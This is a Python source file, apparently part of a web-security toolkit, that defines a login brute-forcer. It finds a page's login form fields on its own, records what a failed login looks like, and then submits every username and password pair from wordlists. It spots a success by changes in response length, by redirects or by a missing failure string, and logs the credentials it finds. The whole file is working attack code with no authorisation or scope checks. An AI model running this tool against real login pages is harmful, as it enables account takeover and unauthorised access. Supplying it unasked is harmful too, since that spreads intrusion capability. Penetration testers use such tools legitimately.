import random
import string
from utils.http_client import HttpClient
from utils.reporter import Reporter
from utils.form_parser import get_forms


class LoginBruteforcer:

    def __init__(self, http_client: HttpClient, reporter: Reporter, config: dict):
        self.client = http_client
        self.reporter = reporter
        self.url = config['url']
        self.user_param = config.get('user_param')
        self.pass_param = config.get('pass_param')
        self.USERNAME_KEYWORDS = ['user', 'login', 'email', 'uname', 'username', 'log']
        self.failure_string = config.get('failure_string')

    def _find_login_form_fields(self):
        """
        Automatically finds the login and password field names in a form.
        Returns a tuple (user_field_name, pass_field_name) or (None, None) on failure.
        """
        print("[*] Attempting to auto-discover form parameters...")
        forms = get_forms(self.client, self.url)
        for form in forms:
            pass_field = None
            user_field = None

            #Find the password field first, it's the most reliable indicator
            for field in form['inputs']:
                if field.get('type') == 'password':
                    pass_field = field.get('name')
                    break  # Found it, no need to look further in this form

            #If a password field was found, look for a username field in the same form
            if pass_field:
                for field in form['inputs']:
                    field_name = field.get('name')
                    if field.get('type') in ['text', 'email', 'tel'] or not field.get('type'):
                        if field_name:
                            for keyword in self.USERNAME_KEYWORDS:
                                if keyword in field_name.lower():
                                    user_field = field_name
                                    print(
                                        f"[*] Auto-discovery successful! Found user param: '{user_field}', pass param: '{pass_field}'")
                                    return (user_field, pass_field)

        print("Auto-discovery failed. Please provide parameters manually using --user-param and --pass-param.")
        return (None, None)

    def _get_failure_baseline(self):
        """
        Sends a request with deliberately invalid credentials to establish a
        "failure baseline" tuple: (content_length, redirect_count).
        """
        print("[*] Establishing a failure baseline...")
        #Generate long, random strings that are highly unlikely to be valid
        random_user = ''.join(random.choice(string.ascii_lowercase) for i in range(15))
        random_pass = ''.join(random.choice(string.ascii_lowercase) for i in range(15))
        payload = {self.user_param: random_user, self.pass_param: random_pass}

        try:
            response = self.client.session.post(self.url, data=payload)
            #capturing a tuple of characteristics as our baseline
            baseline = (len(response.content), len(response.history))
            print(f"[*] Baseline established. Length: {baseline[0]} bytes, Redirects: {baseline[1]}")
            return baseline
        except Exception as e:
            print(f"[!] Critical error while establishing baseline: {e}")
            return None

    def _try_login(self, username, password, baseline):
        """Attempts a login and uses anomaly detection"""
        baseline_length, baseline_redirects = baseline
        payload = {self.user_param: username, self.pass_param: password}
        try:
            response = self.client.session.post(self.url, data=payload)
            current_length = len(response.content)
            current_redirects = len(response.history)
            if current_length != baseline_length or current_redirects != baseline_redirects:
                return True
        except Exception:
            pass
        return False

    def _try_login_by_string(self, username, password):
        """Attempts a login and checks for the absence of a failure string"""
        payload = {self.user_param: username, self.pass_param: password}
        try:
            response = self.client.session.post(self.url, data=payload)
            if self.failure_string.lower() not in response.text.lower():
                return True
        except Exception:
            pass
        return False

    def run_attack(self, user_list_path, pass_list_path):
        """Runs the brute-force attack using the appropriate detection method"""

        #Auto-discover params if needed
        if not self.user_param or not self.pass_param:
            self.user_param, self.pass_param = self._find_login_form_fields()
        if not self.user_param or not self.pass_param:
            return None

        #Load wordlists
        try:
            with open(user_list_path, 'r') as f:
                usernames = [line.strip() for line in f]
            with open(pass_list_path, 'r') as f:
                passwords = [line.strip() for line in f]
        except FileNotFoundError as e:
            print(f"❌ ERROR: Could not find wordlist file: {e}")
            return None

        #Decide which mode to use
        if self.failure_string:
            print("[*] Starting string-matching based login brute-force attack...")
            attack_logic = lambda u, p: self._try_login_by_string(u, p)
        else:
            print("[*] Starting anomaly-based login brute-force attack...")
            baseline = self._get_failure_baseline()
            if baseline is None:
                print("Could not establish a failure baseline. Aborting attack.")
                return None
            attack_logic = lambda u, p: self._try_login(u, p, baseline)

        print(f"[*] Loaded {len(usernames)} usernames and {len(passwords)} passwords.")
        print(f"[*] Total attempts to make: {len(usernames) * len(passwords)}")

        for username in usernames:
            for password in passwords:
                print(f"[*] Trying: {username}:{password}", end='\r')
                if attack_logic(username, password):
                    success_message = f"\nSuccess! Potential credentials found: {username}:{password}"
                    print(success_message, " " * 20)
                    self.reporter.log_raw('login_bruteforcer', {"found_credentials": success_message})
                    return (username, password)

        print(f"\n[-] Brute-force attack finished. No credentials found.")
        return None